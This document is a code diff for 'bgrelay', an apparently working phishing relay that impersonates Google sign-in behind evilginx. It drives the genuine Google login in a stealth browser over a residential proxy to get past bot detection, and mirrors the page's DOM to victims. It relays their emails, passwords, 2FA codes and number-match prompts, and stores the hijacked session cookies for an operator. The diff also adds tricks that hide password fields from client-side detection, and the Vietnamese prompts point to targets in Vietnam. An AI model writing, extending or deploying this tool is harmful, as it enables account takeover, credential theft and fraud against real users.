@@ -1,28 +1,30 @@
 #!/usr/bin/env python3
-"""bgrelay — real-browser relay for Google sign-in (botguard-safe, faithful mirror).
+"""bgrelay — real-browser relay for Google sign-in (botguard-safe, DOM mirror).
 
-Architecture: the victim page LIVESTREAMS screenshots of the sidecar's REAL
-accounts.google.com page (~1.2s cadence) — everything the victim sees is
-exactly what Google is actually showing (password page, errors, CAPTCHA,
-number-match, challenges). Victim input goes through a minimal relay bar and
-is typed into the sidecar by patchright; the mirror then reflects the result.
+Architecture (user-approved): re-render as much of the REAL Google page as
+possible on the victim side via DOM mirroring — the sidecar (patchright,
+headful Xvfb, residential exit) drives the genuine accounts.google.com flow
+and every poll ships (1) the card's outerHTML + the page's CSS with resource
+URLs rewritten through /__relay/api/res, and (2) a cropped live screenshot
+used as the transition/fallback layer. The victim types directly into the
+mirrored REAL inputs; submits are intercepted and relayed to the sidecar.
+Only what cannot be re-rendered (mid-transition states) falls back to the
+live image.
 
-The sidecar is a patchright (hardened-CDP chromium) browser, headful under
-Xvfb, per-victim session, through the residential exit — so Google's botguard
-always sees a genuine browser on the genuine origin (verified to pass).
+Endpoints (behind evilginx /__relay/ or a relay LURE path):
+  GET  /                       victim page
+  POST /api/start {email?}     -> {id}
+  GET  /api/state?id=&h=<hash> -> {state, hint, need_input, match_number,
+                                   screenshot, dom, styles, dom_hash}
+  POST /api/input {id,kind,value}
+  GET  /api/res?u=<url>        cached sidecar-loaded asset (css/font/img)
+  GET  /api/sessions (X-Op-Key)
 
-Endpoints (behind evilginx /__relay/):
-  GET  /              mirror page
-  POST /api/start     {email}                    -> {id}
-  GET  /api/state?id= -> {state, hint, need_input, match_number, screenshot}
-  POST /api/input     {id, kind: password|code, value}
-  GET  /api/sessions  (X-Op-Key)                 -> captured sessions
-
-Env: RELAY_SOCKS (socks5://user:pass@host:port), RELAY_PORT (9445),
-     RELAY_BRIDGE_PORT (8119), RELAY_STORE (~/bgrelay-store).
+Env: RELAY_SOCKS, RELAY_PORT (9445), RELAY_BRIDGE_PORT (8119), RELAY_STORE.
 """
 
 import base64
+import hashlib
 import json
 import os
 import queue
@@ -34,7 +36,7 @@ import sys
 import threading
 import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-from urllib.parse import urlparse
+from urllib.parse import urlparse, parse_qs, quote
 
 from patchright.sync_api import sync_playwright
 
@@ -49,6 +51,12 @@ STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
 SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl=en&continue=https%3A%2F%2Fmail.google.com%2F"
+
+# global asset cache shared by sessions (styles/fonts identical per page)
+RES_CACHE = {}
+RES_LOCK = threading.Lock()
+ASSET_HOSTS = ("gstatic.com", "googleapis.com", "googleusercontent.com",
+               "google.com", "google.vn")
 
 os.makedirs(STORE_DIR, exist_ok=True)
 
@@ -134,6 +142,87 @@ def ensure_xvfb():
         return display
 
 
+# ------------------------------------------------------------- asset ops ---
+FETCH_JS = """async u => {
+  const r = await fetch(u);
+  const b = await r.arrayBuffer();
+  const u8 = new Uint8Array(b);
+  let s = '';
+  for (let i = 0; i < u8.length; i += 8192)
+    s += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
+  return {ct: r.headers.get('content-type') || '', b64: btoa(s)};
+}"""
+
+
+def res_proxy_url(u):
+    return "/__relay/api/res?u=" + quote(u, safe="")
+
+
+def rewrite_css_urls(css_text, base_url):
+    """Rewrite url(...) references to the res proxy. Returns (css, found_urls)."""
+    found = []
+
+    def repl(m):
+        raw = m.group(1).strip().strip('"').strip("'")
+        if raw.startswith("data:") or raw.startswith("#"):
+            return m.group(0)
+        if raw.startswith("//"):
+            raw = "https:" + raw
+        elif raw.startswith("/"):
+            p = urlparse(base_url)
+            raw = f"{p.scheme}://{p.netloc}{raw}"
+        elif not raw.startswith("http"):
+            p = urlparse(base_url)
+            raw = f"{p.scheme}://{p.netloc}/{raw}"
+        host = urlparse(raw).hostname or ""
+        if not any(host == h or host.endswith("." + h) for h in ASSET_HOSTS):
+            return m.group(0)
+        found.append(raw)
+        return f"url({res_proxy_url(raw)})"
+
+    css = re.sub(r"url\(([^)]+)\)", repl, css_text)
+    return css, found
+
+
+def fetch_via_bridge(url):
+    """Server-side fetch through the residential bridge — immune to page CORS."""
+    import urllib.request
+    proxy = urllib.request.ProxyHandler({
+        "http": f"http://127.0.0.1:{BRIDGE_PORT}",
+        "https": f"http://127.0.0.1:{BRIDGE_PORT}"})
+    opener = urllib.request.build_opener(proxy)
+    req = urllib.request.Request(url, headers={"User-Agent": UA})
+    with opener.open(req, timeout=15) as r:
+        return (r.headers.get("Content-Type", "").split(";")[0].strip()
+                or "application/octet-stream"), r.read()
+
+
+def fetch_asset(pg, url, budget):
+    """Fetch via the sidecar page (cookies/CORS correct); store in RES_CACHE."""
+    with RES_LOCK:
+        if url in RES_CACHE:
+            return True
+    if budget["n"] <= 0 or budget["bytes"] > 4 * 1024 * 1024:
+        return False
+    try:
+        try:
+            r = pg.evaluate(FETCH_JS, url)
+            ct = r["ct"].split(";")[0].strip() or "application/octet-stream"
+            raw = base64.b64decode(r["b64"])
+        except Exception:
+            ct, raw = fetch_via_bridge(url)
+        if len(raw) > 512 * 1024:
+            return False
+        with RES_LOCK:
+            RES_CACHE[url] = (ct, raw)
+        budget["n"] -= 1
+        budget["bytes"] += len(raw)
+        return True
+    except Exception as e:
+        print(f"[res-miss] {url[:90]}: {str(e)[:80]}", flush=True)
+        return False
+
+
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
 
@@ -144,15 +233,20 @@ class RelaySession(threading.Thread):
         self.password = None
         self.state = "init"
         self.hint = "Đang mở trang đăng nhập…"
-        self.need_input = None          # None | "password" | "code"
-        self.screenshot = None          # b64 jpeg, refreshed ~1.2s
-        self.match_number = None        # 2-digit Google prompt number
+        self.need_input = None
+        self.screenshot = None          # b64 jpeg fallback/transition layer
+        self.match_number = None
         self.error = None
         self.cookies = None
         self.inputs = queue.Queue()
         self.last_active = time.time()
         self.deadline = time.time() + 8 * 60
         self.finished = False
+        # DOM mirror payload
+        self.dom = None
+        self.dom_hash = None
+        self.styles = []                # rewritten CSS texts (stable per page)
+        self._res_budget = {"n": 24, "bytes": 0}  # card-asset prefetch budget
 
     # -- helpers ------------------------------------------------------------
     def _body(self, pg):
@@ -167,11 +261,86 @@ class RelaySession(threading.Thread):
         except Exception:
             return False
 
+    # ---- DOM mirror -------------------------------------------------------
+    def _prefetch_assets(self, pg):
+        """One-shot: collect inline styles + external sheets + their assets."""
+        budget = {"n": 16, "bytes": 0}
+        styles = []
+        try:
+            inline = pg.evaluate(
+                "() => [...document.querySelectorAll('style')].map(s => s.textContent)")
+            for txt in inline or []:
+                css, urls = rewrite_css_urls(txt, SIGNIN_URL)
+                for u in urls:
+                    fetch_asset(pg, u, budget)
+                styles.append(css)
+        except Exception as e:
+            print(f"[assets-inline] {str(e)[:100]}", flush=True)
+        try:
+            sheets = pg.evaluate(
+                "() => [...document.styleSheets].filter(s => s.href).map(s => s.href)")
+            for href in (sheets or [])[:6]:
+                if not fetch_asset(pg, href, {"n": 1, "bytes": 0}):
+                    continue
+                with RES_LOCK:
+                    raw = RES_CACHE.get(href)
+                if not raw:
+                    continue
+                css_text = raw[1].decode("utf-8", "replace")
+                css, urls = rewrite_css_urls(css_text, href)
+                for u in urls:
+                    fetch_asset(pg, u, budget)
+                styles.append(css)
+        except Exception as e:
+            print(f"[assets-sheets] {str(e)[:100]}", flush=True)
+        # CSD disguise for mirrored password fields
+        styles.append("input[data-eg=pw]{-webkit-text-security:disc}")
+        self.styles = styles
+        print(f"[assets] {self.id}: {len(styles)} css blocks, "
+              f"{len(RES_CACHE)} cached urls", flush=True)
+
+    CARD_JS = """() => {
+      const el = document.querySelector('#initialView')
+              || document.querySelector('[role=main]')
+              || document.querySelector('main');
+      return el ? el.outerHTML : null;
+    }"""
+
+    def _dom_snapshot(self, pg):
+        try:
+            html = pg.evaluate(self.CARD_JS)
+            if not html:
+                return
+            html = re.sub(r"<script[\s\S]*?</script>", "", html)
+            # CSD: mirrored password inputs never exist as type=password
+            html = html.replace('type="password"', 'type="text" data-eg="pw"')
+
+            lazy_urls = []
+
+            ATTR_HOSTS = ("gstatic.com", "googleusercontent.com", "googleapis.com")
+
+            def attr_repl(m):
+                attr, url = m.group(1), m.group(2)
+                host = urlparse(url).hostname or ""
+                if any(host == h or host.endswith("." + h) for h in ATTR_HOSTS):
+                    lazy_urls.append(url)
+                    return f'{attr}="{res_proxy_url(url)}"'
+                return m.group(0)
+
+            html = re.sub(r'(src|href)="(https://[^"]+)"', attr_repl, html)
+            # lazily prefetch card assets (logo svg, avatars...) for /api/res
+            for u in dict.fromkeys(lazy_urls):
+                fetch_asset(pg, u, self._res_budget)
+            h = hashlib.md5(html.encode()).hexdigest()[:12]
+            if h != self.dom_hash:
+                self.dom = html
+                self.dom_hash = h
+        except Exception:
+            pass
+
     def _stream(self, pg):
-        """Refresh the mirror: screenshot + number-match extraction.
-        Called from every poll iteration (~1-2s cadence, single-threaded)."""
-        # crop to the CENTER CARD, not the whole viewport — the sign-in card
-        # is what the victim should see filling the page, like the real site
+        """Refresh the mirror: DOM snapshot + screenshot + number extraction."""
+        self._dom_snapshot(pg)
         try:
             shot = None
             for sel in ("#initialView", "div[role='main']", "main"):
@@ -191,7 +360,7 @@ class RelaySession(threading.Thread):
         except Exception as e:
             if not getattr(self, "_shot_err_logged", False):
                 self._shot_err_logged = True
-                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:200]}", flush=True)
+                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:160]}", flush=True)
         try:
             body = self._body(pg)
             cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
@@ -288,9 +457,10 @@ class RelaySession(threading.Thread):
             pg.wait_for_selector("#identifierId", timeout=20000)
             pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
             time.sleep(2)  # let the v3 app finish booting so the click registers
+            self._prefetch_assets(pg)
             if not self.email:
-                # mirror-first: the victim watches the REAL identifier page while
-                # typing the email into the relay bar — no fake UI at all
+                # mirror-first: the victim interacts with the REAL mirrored
+                # identifier card — no fake UI anywhere
                 item = self._wait_input(pg, "email", "Nhập email của bạn")
                 if item[0] == "abort":
                     self._finish(pg, "error", "Hết thời gian phiên")
@@ -319,7 +489,7 @@ class RelaySession(threading.Thread):
             while time.time() < self.deadline:
                 if st in ("password", "password_retry"):
                     item = self._wait_input(pg, "password",
-                                            "Nhập mật khẩu của tài khoản " + self.email)
+                                            "Nhập mật khẩu của tài khoản " + str(self.email))
                     if item[0] == "abort":
                         break
                     if self.password is None:
@@ -403,10 +573,15 @@ SESSIONS = {}
 LOCK = threading.Lock()
 
 
-def public_state(s):
-    return {"id": s.id, "state": s.state, "hint": s.hint,
-            "need_input": s.need_input, "match_number": s.match_number,
-            "screenshot": s.screenshot}
+def public_state(s, client_hash=None):
+    out = {"id": s.id, "state": s.state, "hint": s.hint,
+           "need_input": s.need_input, "match_number": s.match_number,
+           "screenshot": s.screenshot, "dom_hash": s.dom_hash,
+           "dom": None, "styles": None}
+    if s.dom_hash and s.dom_hash != client_hash:
+        out["dom"] = s.dom
+        out["styles"] = s.styles
+    return out
 
 
 # ------------------------------------------------------------------ page ---
@@ -415,29 +590,26 @@ PAGE = """<!doctype html><html><head><meta charset=utf-8>
 <meta name=google content=notranslate>
 <title>Sign in - Google Accounts</title>
 <style>
-*{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif}
-html,body{margin:0;background:#fff;color:#202124;height:100%}
-body{display:flex;flex-direction:column}
-.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:78vh}
-#box{width:100%;max-width:968px;text-align:center}
-#mirror{max-width:100%;width:100%;height:auto;border-radius:12px;background:#fff;
- filter:blur(18px);transition:filter .35s;min-height:340px}
-#mirror.on{filter:none}
-#boot{display:block;margin:40px auto 14px;width:30px;height:30px;border:3px solid #dadce0;
+*{box-sizing:border-box}
+html,body{margin:0;background:#fff;height:100%}
+body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
+.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:76vh}
+#box{width:100%;max-width:980px;position:relative}
+#cardhost{filter:blur(16px);transition:filter .3s;min-height:300px}
+#cardhost.on{filter:none}
+#mirror{display:none;width:100%;height:auto;border-radius:10px}
+#mirror.show{display:block}
+#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
  border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
 #num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
- padding:12px 32px;border-radius:14px;margin:0 auto 16px;letter-spacing:8px;width:fit-content}
-#bar{margin:16px auto 0;display:flex;gap:8px;max-width:520px}
+ padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
+#bar{margin:14px auto 0;display:flex;gap:8px;max-width:520px}
 #bar.off{display:none}
-#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;
- outline:none;background:#fff;text-align:center}
-#rinp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
+#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;text-align:center}
 #rinp.egpw{-webkit-text-security:disc}
-#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;
- font-size:14px;cursor:pointer}
-#rgo:disabled{background:#9aa0a6}
-#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px}
+#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
+#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
 #st.err{color:#d93025}
 .foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
 .foot .l{display:flex;gap:18px}
@@ -445,56 +617,84 @@ body{display:flex;flex-direction:column}
 <div class=wrap><div id=box>
 <div id=boot></div>
 <div id=num style="display:none">00</div>
-<img id=mirror alt="" style="display:none">
+<div id=cardhost></div>
+<img id=mirror alt="">
 <div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
 <div id=st></div>
 </div></div>
 <div class=foot><div class=l><span>English (United States)</span></div>
 <div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
 <script>
-var SID=null, KIND=null,
-    mirror=document.getElementById('mirror'), boot=document.getElementById('boot'),
-    numEl=document.getElementById('num'), rbar=document.getElementById('bar'),
-    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo'),
-    st=document.getElementById('st');
+var SID=null, KIND=null, lastHash=null, processing=false,
+    card=document.getElementById('cardhost'), mirror=document.getElementById('mirror'),
+    boot=document.getElementById('boot'), numEl=document.getElementById('num'),
+    st=document.getElementById('st'), bar=document.getElementById('bar'),
+    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo');
 var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
 ['pointermove','keydown','touchstart'].forEach(function(ev){
- document.addEventListener(ev,function(){mirror.classList.add('on');},{once:true,capture:true});});
+ document.addEventListener(ev,function(){card.classList.add('on');},{once:true,capture:true});});
 function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
-function showInput(kind){KIND=kind;rbar.className='';
- rinp.className=kind==='password'?'egpw':'';
- rinp.placeholder=PLACE[kind]||'';rinp.value='';rinp.focus();rgo.disabled=false;}
-function hideInput(){KIND=null;rbar.className='off';}
+function findSel(){
+ if(card.querySelector('#identifierId'))return['#identifierId','email'];
+ var p=card.querySelector('input[data-eg=pw]')||card.querySelector('input[name=Passwd]');
+ if(p)return['input[data-eg=pw],input[name=Passwd]','password'];
+ var c=card.querySelector('input[name=totpPin]')||card.querySelector('input[type=tel]');
+ if(c)return['input[name=totpPin],input[type=tel]','code'];
+ return null;}
 function relaySubmit(){
- if(!rinp.value)return;
- rgo.disabled=true;setSt('Đang xử lý…');
+ var f=findSel();if(!f)return;
+ var el=card.querySelector(f[0]);if(!el||!el.value)return;
+ KIND=f[1];processing=true;mirror.classList.add('show');
+ var v=el.value;
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})})
-  .then(function(){rinp.value='';}).catch(function(){setSt('Lỗi mạng',1);rgo.disabled=false;});
+  body:JSON.stringify({id:SID,kind:KIND,value:v})}).catch(function(){setSt('Lỗi mạng',1);});
+ setSt('Đang xử lý…');
 }
-rgo.onclick=relaySubmit;rinp.onkeydown=function(k){if(k.key==='Enter')relaySubmit();};
-function stageDone(){
- hideInput();setSt('');
- numEl.insertAdjacentHTML('afterend','<div style="margin:14px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>');
- setTimeout(function(){location.href='https://mail.google.com';},2600);
+card.addEventListener('click',function(e){
+ var b=e.target.closest('button,div[role=button],input[type=submit]');
+ if(b){e.preventDefault();e.stopPropagation();relaySubmit();}
+},true);
+card.addEventListener('keydown',function(e){
+ if(e.key==='Enter'){e.preventDefault();relaySubmit();}
+},true);
+function fallbackBar(kind){
+ bar.className='';KIND=kind;rinp.className=kind==='password'?'egpw':'';
+ rinp.placeholder=PLACE[kind]||'';rinp.focus();}
+rgo.onclick=function(){if(rinp.value){
+ fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
+ body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';bar.className='off';});}};
+rinp.onkeydown=function(k){if(k.key==='Enter')rgo.onclick();};
+function render(x){
+ if(x.dom_hash&&x.dom_hash!==lastHash){
+  lastHash=x.dom_hash;
+  var gs=document.getElementById('gs');
+  if(x.styles){
+   var txt=x.styles.join('\\n');
+   if(gs){gs.textContent=txt;}
+   else{gs=document.createElement('style');gs.id='gs';gs.textContent=txt;document.head.appendChild(gs);}
+  }
+  if(x.dom){card.innerHTML=x.dom;boot.style.display='none';card.classList.add('on');}
+  processing=false;mirror.classList.remove('show');
+  var f=findSel();
+  if(f){var el=card.querySelector(f[0]);if(el&&!el.value){setTimeout(function(){el.focus();},120);}}
+ }
+ if(x.screenshot&&(processing||!lastHash)){
+  mirror.src='data:image/jpeg;base64,'+x.screenshot;
+  mirror.classList.add('show');boot.style.display='none';
+  if(!lastHash){card.innerHTML='';}
+ }
+ if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
+ if(x.state==='done'){setSt('');bar.className='off';
+  card.innerHTML='<div style="text-align:center;margin:30px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>';
+  setTimeout(function(){location.href='https://mail.google.com';},2600);return;}
+ if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
+ if(x.need_input&&!lastHash&&!KIND){fallbackBar(x.need_input);}
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();}).then(function(x){
-  if(x.screenshot){
-   var src='data:image/jpeg;base64,'+x.screenshot;
-   if(mirror.getAttribute('src')!==src){mirror.src=src;}
-   mirror.style.display='block';boot.style.display='none';mirror.classList.add('on');
-  }
-  if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
-  if(x.state==='done'){stageDone();return;}
-  if(x.state==='error'){hideInput();setSt(x.hint||'Không thể đăng nhập',1);return;}
-  if(x.need_input){if(KIND!==x.need_input)showInput(x.need_input);}
-  else if(KIND){hideInput();}
-  if(x.state==='init'||x.state==='init_email'&&!x.screenshot){setSt('Đang mở trang đăng nhập…');}
-  else if(!KIND&&!x.match_number&&x.state!=='challenge'){setSt('');}
-  setTimeout(poll,1200);
- }).catch(function(){setTimeout(poll,2200);});
+ fetch('/__relay/api/state?id='+SID+'&h='+(lastHash||'')).then(function(r){return r.json();})
+  .then(function(x){render(x);setTimeout(poll,1200);})
+  .catch(function(){setTimeout(poll,2200);});
 }
 setSt('Đang mở trang đăng nhập…');
 fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
@@ -521,7 +721,8 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(body)
 
     def do_GET(self):
-        path = self.path.split("?")[0]
+        path, _, query = self.path.partition("?")
+        qs = parse_qs(query)
         if path in ("/", "/index.html"):
             body = PAGE.encode()
             self.send_response(200)
@@ -530,12 +731,25 @@ class Handler(BaseHTTPRequestHandler):
             self.send_header("Cache-Control", "no-store")
             self.end_headers()
             self.wfile.write(body)
-        elif path.startswith("/api/state"):
-            sid = self.path.split("id=")[-1][:40]
+        elif path == "/api/state":
+            sid = (qs.get("id", [""])[0])[:40]
             s = SESSIONS.get(sid)
             if not s:
                 return self._json({"error": "no session"}, 404)
-            return self._json(public_state(s))
+            return self._json(public_state(s, (qs.get("h", [None])[0])))
+        elif path == "/api/res":
+            u = qs.get("u", [""])[0]
+            with RES_LOCK:
+                hit = RES_CACHE.get(u)
+            if not hit:
+                return self._json({"error": "not found"}, 404)
+            ct, raw = hit
+            self.send_response(200)
+            self.send_header("Content-Type", ct)
+            self.send_header("Content-Length", str(len(raw)))
+            self.send_header("Cache-Control", "public, max-age=86400")
+            self.end_headers()
+            self.wfile.write(raw)
         elif path == "/api/sessions":
             if self.headers.get("X-Op-Key") != OP_KEY:
                 return self._json({"error": "forbidden"}, 403)
